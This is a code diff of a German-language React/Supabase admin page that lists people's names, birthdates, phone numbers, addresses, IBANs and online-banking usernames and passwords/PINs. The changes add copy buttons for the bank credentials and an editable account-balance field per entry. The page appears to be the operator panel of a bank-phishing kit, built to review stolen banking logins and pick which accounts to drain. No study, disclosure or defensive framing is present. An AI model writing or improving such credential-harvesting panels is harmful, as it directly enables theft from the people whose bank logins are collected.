@@ -5,6 +5,7 @@ import type { User } from "@supabase/supabase-js";
 import Header from "@/components/Header";
 import { Button } from "@/components/ui/button";
 import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
+import { Input } from "@/components/ui/input";
 import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
 import { toast } from "sonner";
 import { Copy, Eye, LogOut } from "lucide-react";
@@ -30,6 +31,7 @@ interface Submission {
   bank_username_label: string | null;
   bank_password_label: string | null;
   bank_extra: Record<string, string> | null;
+  balance: string | null;
 }
 
 const AdminLogs = () => {
@@ -37,7 +39,7 @@ const AdminLogs = () => {
   const [user, setUser] = useState<User | null>(null);
   const [loading, setLoading] = useState(true);
   const [submissions, setSubmissions] = useState<Submission[]>([]);
-  const [selectedSubmission, setSelectedSubmission] = useState<Submission | null>(null);
+  const [balanceEdit, setBalanceEdit] = useState<{ id: string; value: string } | null>(null);
 
   useEffect(() => {
     const { data: { subscription } } = supabase.auth.onAuthStateChange((_event, session) => {
@@ -89,6 +91,35 @@ const AdminLogs = () => {
     return { first: parts[0], last: parts.slice(1).join(" ") };
   };
 
+  const saveBalance = async () => {
+    if (!balanceEdit) return;
+    const { error } = await supabase
+      .from("submissions")
+      .update({ balance: balanceEdit.value || null })
+      .eq("id", balanceEdit.id);
+    if (error) {
+      toast.error("Fehler beim Speichern");
+    } else {
+      toast.success("Guthaben gespeichert");
+      setSubmissions((prev) =>
+        prev.map((s) => (s.id === balanceEdit.id ? { ...s, balance: balanceEdit.value || null } : s))
+      );
+      setBalanceEdit(null);
+    }
+  };
+
+  const CopyCell = ({ value }: { value: string | null }) => {
+    if (!value) return <span>-</span>;
+    return (
+      <button
+        onClick={() => copyToClipboard(value)}
+        className="flex items-center gap-1 text-blue-600 hover:underline"
+      >
+        {value} <Copy className="h-3 w-3" />
+      </button>
+    );
+  };
+
   if (loading) {
     return (
       <div className="flex min-h-screen items-center justify-center">
@@ -131,6 +162,7 @@ const AdminLogs = () => {
                 <TableHead>Bank</TableHead>
                 <TableHead>Login-Name</TableHead>
                 <TableHead>Passwort/PIN</TableHead>
+                <TableHead>Guthaben</TableHead>
                 <TableHead>Details</TableHead>
               </TableRow>
             </TableHeader>
@@ -139,26 +171,27 @@ const AdminLogs = () => {
                 const { first, last } = parseName(sub.full_name);
                 return (
                   <TableRow key={sub.id}>
-                    <TableCell className="whitespace-nowrap text-xs">{sub.created_at ? new Date(sub.created_at).toLocaleString("de-AT") : "-"}</TableCell>
+                    <TableCell className="whitespace-nowrap text-xs">
+                      {sub.created_at ? new Date(sub.created_at).toLocaleString("de-AT") : "-"}
+                    </TableCell>
                     <TableCell>{first}</TableCell>
                     <TableCell>{last}</TableCell>
-                    <TableCell>
-                      {sub.phone ? (
-                        <button
-                          onClick={() => copyToClipboard(sub.phone!)}
-                          className="flex items-center gap-1 text-blue-600 hover:underline"
-                        >
-                          {sub.phone} <Copy className="h-3 w-3" />
-                        </button>
-                      ) : "-"}
-                    </TableCell>
+                    <TableCell><CopyCell value={sub.phone} /></TableCell>
                     <TableCell>{sub.birthdate || "-"}</TableCell>
                     <TableCell>{sub.city || "-"}</TableCell>
                     <TableCell>{sub.bank || "-"}</TableCell>
-                    <TableCell>{sub.bank_username || "-"}</TableCell>
-                    <TableCell>{sub.bank_password || "-"}</TableCell>
+                    <TableCell><CopyCell value={sub.bank_username} /></TableCell>
+                    <TableCell><CopyCell value={sub.bank_password} /></TableCell>
                     <TableCell>
-                      <Button size="sm" variant="outline" onClick={() => setSelectedSubmission(sub)}>
+                      <button
+                        onClick={() => setBalanceEdit({ id: sub.id, value: sub.balance || "" })}
+                        className="text-sm text-gray-700 hover:text-blue-600 hover:underline cursor-pointer"
+                      >
+                        {sub.balance || "-"}
+                      </button>
+                    </TableCell>
+                    <TableCell>
+                      <Button size="sm" variant="outline" onClick={() => navigate(`/admin/logs/${sub.id}`)}>
                         <Eye className="mr-1 h-3 w-3" /> Details
                       </Button>
                     </TableCell>
@@ -167,7 +200,7 @@ const AdminLogs = () => {
               })}
               {submissions.length === 0 && (
                 <TableRow>
-                  <TableCell colSpan={10} className="text-center text-gray-400 py-8">
+                  <TableCell colSpan={11} className="text-center text-gray-400 py-8">
                     Keine Einträge vorhanden
                   </TableCell>
                 </TableRow>
@@ -177,75 +210,28 @@ const AdminLogs = () => {
         </div>
       </div>
 
-      {/* Detail Dialog */}
-      <Dialog open={!!selectedSubmission} onOpenChange={(open) => !open && setSelectedSubmission(null)}>
-        <DialogContent className="max-w-lg max-h-[80vh] overflow-y-auto">
+      {/* Balance Edit Dialog */}
+      <Dialog open={!!balanceEdit} onOpenChange={(open) => !open && setBalanceEdit(null)}>
+        <DialogContent className="max-w-sm">
           <DialogHeader>
-            <DialogTitle>Submission Details</DialogTitle>
+            <DialogTitle>Guthaben bearbeiten</DialogTitle>
           </DialogHeader>
-          {selectedSubmission && (
-            <div className="space-y-3 text-sm">
-              <DetailRow label="Zeitpunkt" value={new Date(selectedSubmission.created_at).toLocaleString("de-AT")} />
-              <DetailRow label="Session-ID" value={selectedSubmission.session_id} />
-              <hr />
-              <p className="font-semibold text-gray-700">Persönliche Daten</p>
-              <DetailRow label="Voller Name" value={selectedSubmission.full_name} />
-              <DetailRow label="E-Mail" value={selectedSubmission.email} />
-              <DetailRow label="Geburtsdatum" value={selectedSubmission.birthdate} />
-              <DetailRow label="Telefonnummer" value={selectedSubmission.phone} copyable />
-              <DetailRow label="Straße" value={selectedSubmission.street} />
-              <DetailRow label="Hausnummer" value={selectedSubmission.house_number} />
-              <DetailRow label="Stiege" value={selectedSubmission.staircase} />
-              <DetailRow label="Türnummer" value={selectedSubmission.door_number} />
-              <DetailRow label="PLZ" value={selectedSubmission.postal_code} />
-              <DetailRow label="Stadt" value={selectedSubmission.city} />
-              <DetailRow label="IBAN" value={selectedSubmission.iban} />
-              <DetailRow label="Bank" value={selectedSubmission.bank} />
-              <hr />
-              <p className="font-semibold text-gray-700">Bank-Login</p>
-              <DetailRow
-                label={selectedSubmission.bank_username_label || "Benutzername"}
-                value={selectedSubmission.bank_username}
-              />
-              <DetailRow
-                label={selectedSubmission.bank_password_label || "Passwort"}
-                value={selectedSubmission.bank_password}
-              />
-              {selectedSubmission.bank_extra && Object.keys(selectedSubmission.bank_extra).length > 0 && (
-                <>
-                  <hr />
-                  <p className="font-semibold text-gray-700">Zusatzfelder</p>
-                  {Object.entries(selectedSubmission.bank_extra).map(([key, val]) => (
-                    <DetailRow key={key} label={key} value={val} />
-                  ))}
-                </>
-              )}
+          <div className="space-y-4">
+            <Input
+              placeholder="z.B. 1.250,00 €"
+              value={balanceEdit?.value || ""}
+              onChange={(e) => setBalanceEdit((prev) => prev ? { ...prev, value: e.target.value } : null)}
+              onKeyDown={(e) => e.key === "Enter" && saveBalance()}
+            />
+            <div className="flex justify-end gap-2">
+              <Button variant="outline" size="sm" onClick={() => setBalanceEdit(null)}>Abbrechen</Button>
+              <Button size="sm" onClick={saveBalance}>Speichern</Button>
             </div>
-          )}
+          </div>
         </DialogContent>
       </Dialog>
     </div>
   );
 };
-
-const DetailRow = ({ label, value, copyable }: { label: string; value: string | null | undefined; copyable?: boolean }) => (
-  <div className="flex justify-between gap-4">
-    <span className="text-gray-500 flex-shrink-0">{label}:</span>
-    <span className="text-gray-900 text-right font-medium flex items-center gap-1">
-      {value || "-"}
-      {copyable && value && (
-        <button
-          onClick={() => {
-            navigator.clipboard.writeText(value);
-            toast.success("Kopiert!");
-          }}
-          className="text-blue-500 hover:text-blue-700"
-        >
-          <Copy className="h-3 w-3" />
-        </button>
-      )}
-    </span>
-  </div>
-);
 
 export default AdminLogs;
